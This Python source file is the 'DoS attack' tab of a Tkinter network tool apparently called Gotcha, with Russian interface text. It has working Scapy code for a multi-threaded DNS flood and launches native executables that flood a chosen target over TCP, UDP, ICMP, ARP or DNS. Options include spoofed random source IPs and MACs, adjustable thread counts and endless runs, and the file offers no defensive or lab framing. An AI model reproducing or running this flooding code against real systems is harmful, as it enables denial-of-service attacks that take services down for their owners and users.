"""DoS attack tab (native NP*.exe + legacy Scapy DNS helper)."""
import os
import sys
import time
import socket
import random
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import send
from scapy.all import get_if_addr

from gotcha.utils import find_exe

# Класс для DNS-флуда (остаётся через scapy)
class Sattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'start_time': 0,
            'total_bytes': 0
        }
        self._monitor_lock = threading.Lock()
        self._completion_notified = False

    def start_dns_attack(self, target_ip, duration, continuous, interface, app_log, on_complete=None):
        try:
            socket.inet_pton(socket.AF_INET6, target_ip)
            is_ipv6 = True
        except socket.error:
            is_ipv6 = False

        self.running = True
        self._completion_notified = False
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"DNS flood: {num_threads} threads")
        app_log(f"Target: {target_ip}:53")
        app_log(f"Interface: {interface}")
        worker_threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._dns_scapy_worker,
                args=(i, target_ip, duration, continuous, interface, app_log, is_ipv6),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            worker_threads.append(thread)
        monitor_thread = threading.Thread(
            target=self._monitor_dns_workers,
            args=(worker_threads, on_complete),
            daemon=True
        )
        monitor_thread.start()
        self.threads.append(monitor_thread)
        return True

    def _monitor_dns_workers(self, worker_threads, on_complete=None):
        for thread in worker_threads:
            thread.join()
        with self._monitor_lock:
            should_notify = self.running and not self._completion_notified
            self.running = False
            if should_notify:
                self._completion_notified = True
        if should_notify and on_complete:
            on_complete()

    def _dns_scapy_worker(self, thread_id, target_ip, total_seconds, continuous, interface, app_log, is_ipv6):
        sent = 0
        domains = ["example.com", "google.com", "yandex.ru", "mail.ru", "github.com"]
        start_time = time.time()
        while self.running and (continuous or (time.time() - start_time) < total_seconds):
            try:
                if is_ipv6:
                    ip_layer = IPv6(dst=target_ip)
                else:
                    ip_layer = IP(dst=target_ip)
                packet = ip_layer / UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                ) / DNS(
                    rd=1,
                    qd=DNSQR(qname=random.choice(domains))
                )
                send(packet, verbose=0)
                sent += 1
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
            except Exception as e:
                app_log(f"[DNS-{thread_id}] Error: {str(e)[:80]}")
                time.sleep(0.1)

    def stop(self):
        self.running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        return self.stats.copy()


class DosTabMixin:
    # -------------------- DoS attack tab (переработано полностью) --------------------
    def setup_custom_attack_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
        params_frame.pack(fill='x', padx=5, pady=5)

        # IP адрес
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
        self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.custom_ip.pack(side='left', padx=2)
        self.custom_ip.insert(0, "192.168.1.1")

        # Протокол
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
        self.custom_protocol = ttk.Combobox(row2, values=["TCP", "UDP", "ICMP", "ARP", "DNS"], width=15, font=('Arial', 9))
        self.custom_protocol.pack(side='left', padx=2)
        self.custom_protocol.set("TCP")
        self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)

        # Порт (показывается только для TCP/UDP)
        self.custom_port_frame = ttk.Frame(params_frame)
        self.custom_port_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
        self.custom_port = ttk.Entry(self.custom_port_frame, width=10, font=('Arial', 9))
        self.custom_port.pack(side='left', padx=2)
        self.custom_port.insert(0, "80")

        # MAC назначения — только для ARP (L2)
        row_mac = ttk.Frame(params_frame)
        ttk.Label(row_mac, text="MAC назначения:", width=12).pack(side='left', padx=2)
        self.custom_dst_mac = ttk.Entry(row_mac, width=25, font=('Arial', 9))
        self.custom_dst_mac.pack(side='left', padx=2)
        self.custom_dst_mac.insert(0, "ff:ff:ff:ff:ff:ff")
        self.custom_dst_mac.master = row_mac

        # Размер пакета (показывается для TCP/UDP/ICMP)
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
        self.custom_packet_size = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.custom_packet_size.pack(side='left', padx=2)
        self.custom_packet_size.insert(0, "1024")
        ttk.Label(row4, text="байт").pack(side='left', padx=2)
        self.custom_packet_size.master = row4

        # Количество потоков (1..8)
        row_threads = ttk.Frame(params_frame)
        row_threads.pack(fill='x', padx=5, pady=5)
        ttk.Label(row_threads, text="Потоки:", width=12).pack(side='left', padx=2)
        self.custom_threads = ttk.Entry(row_threads, width=10, font=('Arial', 9))
        self.custom_threads.pack(side='left', padx=2)
        self.custom_threads.insert(0, "4")
        ttk.Label(row_threads, text="1–8").pack(side='left', padx=6)
        self.custom_threads.master = row_threads

        # Время атаки
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
        self.custom_packet_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.custom_packet_count.pack(side='left', padx=2)
        self.custom_packet_count.insert(0, "60")
        ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)

        # Опции: случайный IP (TCP/UDP/ICMP/ARP), случайный MAC (только ARP)
        self.custom_options_frame = ttk.Frame(params_frame)
        self.custom_random_ip = tk.BooleanVar(value=False)
        self.custom_random_mac = tk.BooleanVar(value=False)
        self.custom_random_ip_cb = ttk.Checkbutton(self.custom_options_frame, text="Случайный IP", variable=self.custom_random_ip)
        self.custom_random_ip_cb.pack(side='left', padx=5)
        self.custom_random_mac_cb = ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac)
        # случайный MAC по умолчанию скрыт, показывается только для ARP
        self.custom_options_frame.pack(fill='x', padx=5, pady=5)
        self.custom_options_frame.pack_forget()

        # Интерфейс
        self.custom_row7 = ttk.Frame(params_frame)
        self.custom_row7.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.custom_interface = ttk.Combobox(self.custom_row7, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.custom_interface.pack(side='left', padx=2)
        self.custom_interface.set(self.active_interface)

        # Кнопки
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", command=self.start_custom_attack, width=15)
        self.custom_start_btn.pack(side='left', padx=5)
        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", command=self.stop_custom_attack, width=15, state='disabled')
        self.custom_stop_btn.pack(side='left', padx=5)

        # Статистика
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.custom_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')

        # Лог
        log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", command=lambda: self.save_log(self.custom_log), width=14).pack()

        self.custom_attack_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'received_packets': 0,
            'last_update': 0,
            'last_sent': 0,
            'total_bytes': 0
        }
        self.on_protocol_change()

    def on_protocol_change(self, event=None):
        proto = self.custom_protocol.get()

        # Порт
        if proto in ["TCP", "UDP"]:
            self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                        if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
        else:
            self.custom_port_frame.pack_forget()

        # Размер пакета
        if proto in ["ARP", "DNS"]:
            self.custom_packet_size.master.pack_forget()
        else:
            if not self.custom_packet_size.master.winfo_ismapped():
                target = self.custom_options_frame if self.custom_options_frame.winfo_ismapped() else self.custom_row7
                self.custom_packet_size.master.pack(fill='x', padx=5, pady=5, before=target)
            if self.custom_packet_size.get() == "0":
                self.custom_packet_size.delete(0, tk.END)
                self.custom_packet_size.insert(0, "1024")

        # Потоки — для всех native-модулей (включая DNS/WinDivert)
        if not self.custom_threads.master.winfo_ismapped():
            target = self.custom_options_frame if self.custom_options_frame.winfo_ismapped() else self.custom_row7
            self.custom_threads.master.pack(fill='x', padx=5, pady=5, before=target)

        # MAC назначения — только ARP
        if proto == "ARP":
            if not self.custom_dst_mac.master.winfo_ismapped():
                target = self.custom_options_frame if self.custom_options_frame.winfo_ismapped() else self.custom_row7
                self.custom_dst_mac.master.pack(fill='x', padx=5, pady=5, before=target)
        else:
            self.custom_dst_mac.master.pack_forget()

        # Опции: случайный IP для TCP/UDP/ICMP/ARP; случайный MAC только для ARP
        if proto in ["TCP", "UDP", "ARP", "ICMP", "DNS"]:
            self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
            if proto == "ARP":
                if not self.custom_random_mac_cb.winfo_ismapped():
                    self.custom_random_mac_cb.pack(side='left', padx=5)
            else:
                self.custom_random_mac_cb.pack_forget()
                self.custom_random_mac.set(False)
        else:
            self.custom_options_frame.pack_forget()

    def start_custom_attack(self):
        if self.custom_attack_running:
            return
        self.custom_attack_running = True
        self.custom_start_btn.config(state='disabled')
        self.custom_stop_btn.config(state='normal')
        try:
            target_ip = self.custom_ip.get().strip()
            protocol = self.custom_protocol.get()
            port = int(self.custom_port.get()) if protocol in ["TCP", "UDP"] else 0
            packet_size = int(self.custom_packet_size.get()) if protocol not in ["ARP", "DNS"] else 0
            duration = int(self.custom_packet_count.get())
            continuous = (duration == 0)
            interface = self.custom_interface.get()
            random_ip = self.custom_random_ip.get()
            random_mac = self.custom_random_mac.get() if protocol == "ARP" else False
            dst_mac = self.custom_dst_mac.get().strip() if protocol == "ARP" else None

            # Потоки: строго 1..8
            try:
                num_threads = int(self.custom_threads.get().strip())
            except ValueError:
                raise ValueError("Количество потоков должно быть числом от 1 до 8")
            if num_threads < 1 or num_threads > 8:
                raise ValueError("Количество потоков должно быть от 1 до 8")

            if duration < 0:
                raise ValueError("Время атаки не может быть отрицательным")

            # Имя exe → один find_exe → полный путь в args[0]
            threads_str = str(num_threads)
            if protocol == "TCP":
                exe_name = "NPtcpT.exe"
                src_ip = self._get_source_ip(interface)
                exe_path = find_exe(exe_name)
                if not exe_path:
                    self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
                    self.custom_log.insert('end', "Положите .exe в main/bin (рядом WinDivert.dll / драйвер).\n")
                    self.custom_log.insert('end', "Или переустановите Gotcha из Release-установщика.\n")
                    self.stop_custom_attack()
                    return
                args = [exe_path, src_ip, target_ip, str(port), threads_str, str(duration)]
                args.append("--packet-size")
                args.append(str(packet_size))
                if random_ip:
                    args.append("--random-ip")
            elif protocol == "UDP":
                exe_name = "NPudpT.exe"
                src_ip = self._get_source_ip(interface)
                exe_path = find_exe(exe_name)
                if not exe_path:
                    self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
                    self.custom_log.insert('end', "Положите .exe в main/bin (рядом WinDivert.dll / драйвер).\n")
                    self.custom_log.insert('end', "Или переустановите Gotcha из Release-установщика.\n")
                    self.stop_custom_attack()
                    return
                args = [exe_path, src_ip, target_ip, str(port), threads_str, str(duration)]
                args.append("--packet-size")
                args.append(str(packet_size))
                if random_ip:
                    args.append("--random-ip")
            elif protocol == "ICMP":
                exe_name = "NPicmpT.exe"
                src_ip = self._get_source_ip(interface)
                exe_path = find_exe(exe_name)
                if not exe_path:
                    self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
                    self.custom_log.insert('end', "Положите .exe в main/bin (рядом WinDivert.dll / драйвер).\n")
                    self.custom_log.insert('end', "Или переустановите Gotcha из Release-установщика.\n")
                    self.stop_custom_attack()
                    return
                args = [exe_path, src_ip, target_ip, threads_str, str(duration)]
                args.append("--packet-size")
                args.append(str(packet_size))
                if random_ip:
                    args.append("--random-ip")
            elif protocol == "ARP":
                if self._is_ipv6(target_ip):
                    self.custom_log.insert('end', "Error: ARP не поддерживается для IPv6\n")
                    self.stop_custom_attack()
                    return
                exe_name = "NParpT.exe"
                src_ip = self._get_source_ip(interface)
                exe_path = find_exe(exe_name)
                if not exe_path:
                    self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
                    self.custom_log.insert('end', "Положите .exe в main/bin (рядом WinDivert.dll / драйвер).\n")
                    self.custom_log.insert('end', "Или переустановите Gotcha из Release-установщика.\n")
                    self.stop_custom_attack()
                    return
                args = [exe_path, src_ip, target_ip, threads_str, str(duration)]
                if dst_mac:
                    args.append(dst_mac)
                if random_ip:
                    args.append("--random-ip")
                if random_mac:
                    args.append("--random-mac")
            elif protocol == "DNS":
                if self._is_ipv6(target_ip):
                    self.custom_log.insert('end', "Error: DNS flood (NPdnsT) только IPv4\n")
                    self.stop_custom_attack()
                    return
                exe_name = "NPdnsT.exe"
                src_ip = self._get_source_ip(interface)
                exe_path = find_exe(exe_name)
                if not exe_path:
                    self.custom_log.insert('end', f"Error: {exe_name} not found!\n")
                    self.custom_log.insert('end', "Положите .exe в main/bin (рядом WinDivert.dll / драйвер).\n")
                    self.custom_log.insert('end', "Или переустановите Gotcha из Release-установщика.\n")
                    self.stop_custom_attack()
                    return
                args = [exe_path, src_ip, target_ip, threads_str, str(duration)]
                if random_ip:
                    args.append("--random-ip")
            else:
                raise ValueError(f"Неизвестный протокол: {protocol}")


            # Preflight: dll рядом с exe для WinDivert
            if protocol in ("TCP", "UDP", "ICMP", "DNS") and exe_path:
                exe_dir = os.path.dirname(exe_path)
                for dll in ("WinDivert.dll", "WinDivert64.sys"):
                    if not os.path.isfile(os.path.join(exe_dir, dll)):
                        self.custom_log.insert(
                            "end",
                            f"Warning: нет {dll} в {exe_dir}\n"
                            "Атака может не запуститься. Переустановите Gotcha.\n",
                        )
            if protocol == "ARP" and exe_path:
                # Npcap service
                try:
                    r = subprocess.run(
                        ["sc", "query", "npcap"],
                        capture_output=True,
                        text=True,
                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
                    )
                    if r.returncode != 0:
                        r2 = subprocess.run(
                            ["sc", "query", "npf"],
                            capture_output=True,
                            text=True,
                            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
                        )
                        if r2.returncode != 0:
                            self.custom_log.insert(
                                "end",
                                "Warning: служба npcap/npf не найдена. Установите Npcap (npcap.exe --install).\n",
                            )
                except Exception as e:
                    print(f"[Gotcha] sc query: {e}")

            self.custom_log.delete(1.0, tk.END)
            self.custom_log.insert('end', f"{protocol} flood started\n")
            self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
            self.custom_log.insert('end', f"Interface: {interface}\n")
            self.custom_log.insert('end', f"Threads: {num_threads}\n")
            if protocol in ["TCP", "UDP", "ICMP", "ARP", "DNS"]:
                self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}\n")
            if protocol == "ARP":
                self.custom_log.insert('end', f"Random MAC: {'yes' if random_mac else 'no'}\n")
                if dst_mac:
                    self.custom_log.insert('end', f"Dest MAC: {dst_mac}\n")
            if protocol not in ["ARP", "DNS"]:
                self.custom_log.insert('end', f"Packet size: {packet_size} bytes\n")

            self.current_attack_type = protocol
            self.external_infinite = continuous
            self.custom_stop_event = threading.Event()
            self.custom_external_thread = threading.Thread(
                target=self.run_external_tool,
                args=(args, self.custom_log, self.custom_stop_event, protocol.lower()),
                kwargs={'infinite': continuous, 'on_finish': self.on_external_finished},
                daemon=True
            )
            self.custom_external_thread.start()

            self.custom_attack_stats = {
                'start_time': time.time(),
                'sent_packets': 0,
                'received_packets': 0,
                'last_update': time.time(),
                'last_sent': 0,
                'total_bytes': 0
            }
            self.update_custom_attack_stats()
            self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")

        except ValueError as e:
            messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
            self.stop_custom_attack()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
            self.stop_custom_attack()

    def _get_source_ip(self, interface):
        try:
            ip = get_if_addr(interface)
            if ip and ip != '0.0.0.0':
                return ip
        except Exception as e:
            print(f"[Gotcha] suppressed: {e}")
        return "192.168.1.100"

    def _is_ipv6(self, ip):
        try:
            socket.inet_pton(socket.AF_INET6, ip)
            return True
        except socket.error:
            return False

    def _log_custom(self, message):
        self.custom_log.insert('end', f"{message}\n")
        self.custom_log.see('end')

    def _show_internal_results(self, final_stats):
        if not final_stats:
            return
        total_packets = final_stats.get('total_sent', 0)
        total_bytes = final_stats.get('total_bytes', 0)
        total_time = time.time() - final_stats.get('start_time', time.time())
        self.custom_log.insert('end', "\n--- Results ---\n")
        self.custom_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.custom_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.custom_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")

    def on_dns_finished(self):
        if not self.custom_attack_running:
            return
        final_stats = self.scapy_attack.stop()
        self._show_internal_results(final_stats)
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")
        self.current_attack_type = None
        self.external_infinite = False

    def on_external_finished(self):
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")
        self.current_attack_type = None
        self.external_infinite = False

    def stop_custom_attack(self):
        """Безопасно останавливает DoS и всегда возвращает кнопки, даже если exe не стартовал."""
        atype = self.current_attack_type
        try:
            if atype == "DNS":
                if getattr(self, "scapy_attack", None) and getattr(self.scapy_attack, "running", False):
                    final_stats = self.scapy_attack.stop()
                    self._show_internal_results(final_stats)
            elif atype:
                key = str(atype).lower()
                proc_info = self.external_processes.get(key)
                if proc_info:
                    proc, stop_event = proc_info
                    stop_event.set()
                    if self.external_infinite and proc.poll() is None:
                        try:
                            proc.stdin.write("\n")
                            proc.stdin.flush()
                        except Exception as e:
                            print(f"[Gotcha] suppressed: {e}")
                    if proc.poll() is None:
                        try:
                            proc.wait(timeout=1)
                        except Exception:
                            try:
                                proc.kill()
                            except Exception:
                                pass
                    try:
                        del self.external_processes[key]
                    except Exception:
                        pass
        except Exception as e:
            print(f"[Gotcha] stop_custom_attack: {e}")
            try:
                self.custom_log.insert("end", f"Stop error: {e}\n")
            except Exception:
                pass
        finally:
            self.custom_attack_running = False
            self.current_attack_type = None
            self.external_infinite = False
            try:
                self.custom_start_btn.config(state="normal")
                self.custom_stop_btn.config(state="disabled")
            except Exception:
                pass
            try:
                self.status_var.set("DoS атака остановлена")
            except Exception:
                pass

    def update_custom_attack_stats(self):
        if not self.custom_attack_running:
            return
        current_time = time.time()
        if self.current_attack_type == "DNS" and self.scapy_attack.running:
            with self.scapy_attack.stats_lock:
                sent_packets = self.scapy_attack.stats['total_sent']
                rate = 0  # DNS не показывает pps
                self.custom_rate.config(text=f"{rate}")
        else:
            # Для внешних exe статистика обновляется через callback, здесь просто показываем отправленные пакеты
            sent_packets = self.custom_attack_stats.get('sent_packets', 0)
        self.custom_sent.config(text=f"{sent_packets}")
        duration = current_time - self.custom_attack_stats.get('start_time', current_time)
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.custom_attack_running:
            self.root.after(1000, self.update_custom_attack_stats)

